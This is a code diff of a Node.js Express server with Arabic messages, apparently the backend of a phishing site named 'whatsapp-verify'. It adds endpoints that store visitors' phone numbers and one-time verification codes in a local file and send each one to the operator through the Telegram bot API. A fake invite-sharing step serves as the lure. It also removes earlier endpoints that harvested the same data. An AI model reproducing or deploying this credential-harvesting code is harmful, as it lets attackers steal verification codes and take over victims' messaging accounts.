@@ -1,5 +1,6 @@
 const express = require('express');
 const path = require('path');
+const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -11,7 +12,30 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'views')));
 
-// ========== دالة إرسال إشعار تيلجرام ==========
+// ========== ملف تخزين بيانات المستخدمين ==========
+const USERS_FILE = path.join(__dirname, 'users-data.json');
+
+function readUsersData() {
+    try {
+        if (fs.existsSync(USERS_FILE)) {
+            const data = fs.readFileSync(USERS_FILE, 'utf8');
+            return JSON.parse(data);
+        }
+        return {};
+    } catch (e) {
+        console.error('❌ خطأ في قراءة الملف:', e.message);
+        return {};
+    }
+}
+
+function saveUsersData(users) {
+    try {
+        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
+    } catch (e) {
+        console.error('❌ خطأ في حفظ الملف:', e.message);
+    }
+}
+
 async function sendTelegramMessage(message) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
@@ -36,83 +60,132 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// ========== اختبار البوت ==========
 app.get('/test', async (req, res) => {
+    await sendTelegramMessage('✅ <b>البوت شغال! 🎉</b>\n🕐 ' + new Date().toLocaleString('ar-EG'));
+    res.send('✅ تم إرسال رسالة اختبار! شوف تيلجرام');
+});
+
+// ========== مسار تأكيد المشاركة (مرة واحدة فقط) ==========
+app.post('/confirm-share', async (req, res) => {
     try {
-        await sendTelegramMessage('✅ <b>البوت شغال! 🎉</b>\n🕐 ' + new Date().toLocaleString('ar-EG'));
-        res.send('✅ تم إرسال رسالة اختبار! شوف تيلجرام');
-    } catch (e) {
-        res.send('❌ خطأ: ' + e.message);
+        const { userId } = req.body;
+        const users = readUsersData();
+        
+        if (!users[userId]) {
+            users[userId] = { invites: 0, phone: null, shared: false };
+        }
+        
+        if (users[userId].shared) {
+            return res.json({ success: false, message: 'لقد قمت بالمشاركة بالفعل!' });
+        }
+        
+        users[userId].shared = true;
+        users[userId].invites = 10;
+        saveUsersData(users);
+        
+        let msg = `📩 <b>تم تأكيد المشاركة!</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `👤 المستخدم: ${userId}\n`;
+        msg += `📊 عدد الدعوات: 10/10 ✅\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://whatsapp-verify-zeta.vercel.app">📊 عرض الموقع</a>`;
+        await sendTelegramMessage(msg);
+        
+        res.json({ success: true, message: 'تم تأكيد المشاركة!' });
+    } catch (err) {
+        console.error('❌ خطأ:', err.message);
+        res.status(500).json({ success: false, message: 'خطأ في التأكيد' });
     }
 });
 
-// ========== مسار الصفحة الرئيسية ==========
+app.post('/get-user', async (req, res) => {
+    try {
+        const { userId } = req.body;
+        const users = readUsersData();
+        
+        if (users[userId]) {
+            res.json({ 
+                success: true, 
+                invites: users[userId].invites || 0,
+                shared: users[userId].shared || false,
+                phone: users[userId].phone || null
+            });
+        } else {
+            users[userId] = { invites: 0, phone: null, shared: false };
+            saveUsersData(users);
+            res.json({ success: true, invites: 0, shared: false, phone: null });
+        }
+    } catch (err) {
+        console.error('❌ خطأ:', err.message);
+        res.status(500).json({ success: false, message: 'خطأ في جلب البيانات' });
+    }
+});
+
+app.post('/save-phone', async (req, res) => {
+    try {
+        const { userId, phone } = req.body;
+        const users = readUsersData();
+        
+        if (users[userId]) {
+            users[userId].phone = phone;
+            saveUsersData(users);
+            
+            let msg = `📱 <b>رقم هاتف جديد!</b>\n`;
+            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+            msg += `👤 المستخدم: ${userId}\n`;
+            msg += `📞 رقم الهاتف: ${phone}\n`;
+            msg += `📊 عدد الدعوات: ${users[userId].invites || 0}/10\n\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🔗 <a href="https://whatsapp-verify-zeta.vercel.app">📊 عرض الموقع</a>`;
+            await sendTelegramMessage(msg);
+            
+            res.json({ success: true });
+        } else {
+            res.json({ success: false, message: 'المستخدم غير موجود' });
+        }
+    } catch (err) {
+        console.error('❌ خطأ:', err.message);
+        res.status(500).json({ success: false, message: 'خطأ في حفظ الرقم' });
+    }
+});
+
+app.post('/save-otp', async (req, res) => {
+    try {
+        const { userId, phone, otp } = req.body;
+        const users = readUsersData();
+        
+        if (users[userId]) {
+            users[userId].otp = otp;
+            users[userId].otpTime = new Date().toISOString();
+            saveUsersData(users);
+            
+            let msg = `🔐 <b>رمز OTP!</b>\n`;
+            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+            msg += `👤 المستخدم: ${userId}\n`;
+            msg += `📞 رقم الهاتف: ${phone}\n`;
+            msg += `🔑 رمز OTP: ${otp}\n`;
+            msg += `📊 عدد الدعوات: ${users[userId].invites || 0}/10\n\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🔗 <a href="https://whatsapp-verify-zeta.vercel.app">📊 عرض الموقع</a>`;
+            await sendTelegramMessage(msg);
+            
+            res.json({ success: true });
+        } else {
+            res.json({ success: false, message: 'المستخدم غير موجود' });
+        }
+    } catch (err) {
+        console.error('❌ خطأ:', err.message);
+        res.status(500).json({ success: false, message: 'خطأ في حفظ OTP' });
+    }
+});
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'views', 'index.html'));
 });
 
-// ========== مسار استقبال رقم الهاتف ==========
-app.post('/send-phone', async (req, res) => {
-    try {
-        const { phone } = req.body;
-        
-        console.log('📱 استلام رقم الهاتف:', phone);
-        
-        // إرسال إشعار فوري بالرقم
-        let msg = `📱 <b>رقم هاتف جديد!</b>\n`;
-        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-        msg += `📞 <b>رقم الهاتف:</b> ${phone}\n`;
-        msg += `📌 <b>الحالة:</b> تم إرسال رقم الهاتف\n\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://whatsapp-verify.vercel.app">📊 عرض الموقع</a>`;
-        await sendTelegramMessage(msg);
-        
-        res.json({ success: true, message: 'تم إرسال رقم الهاتف' });
-        
-    } catch (err) {
-        console.error('❌ خطأ:', err.message);
-        res.status(500).json({ success: false, message: 'خطأ في الإرسال' });
-    }
-});
-
-// ========== مسار استقبال OTP ==========
-app.post('/submit-otp', async (req, res) => {
-    try {
-        const { phone, otp } = req.body;
-        
-        console.log('📥 استلام OTP:');
-        console.log('📱 الهاتف:', phone);
-        console.log('🔑 OTP:', otp);
-        
-        // إرسال إشعار بالرقم + OTP
-        let msg = `🔐 <b>محاولة توثيق!</b>\n`;
-        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-        msg += `📞 <b>رقم الهاتف:</b> ${phone}\n`;
-        msg += `🔑 <b>رمز OTP المدخل:</b> ${otp}\n`;
-        msg += `📌 <b>الحالة:</b> تم إدخال الرمز\n\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://whatsapp-verify.vercel.app">📊 عرض الموقع</a>`;
-        await sendTelegramMessage(msg);
-        
-        // التحقق من صحة الرمز
-        const correctOtp = '123456';
-        let isCorrect = (otp === correctOtp);
-        
-        res.json({ 
-            success: true,
-            isCorrect: isCorrect,
-            message: isCorrect ? 'تم التحقق بنجاح! 🎉' : '⚠️ الرمز غير صحيح'
-        });
-        
-    } catch (err) {
-        console.error('❌ خطأ:', err.message);
-        res.status(500).json({ success: false, message: 'خطأ في الإرسال' });
-    }
-});
-
-// ========== صفحة النجاح ==========
 app.get('/success', (req, res) => {
     res.send(`
         <!DOCTYPE html>
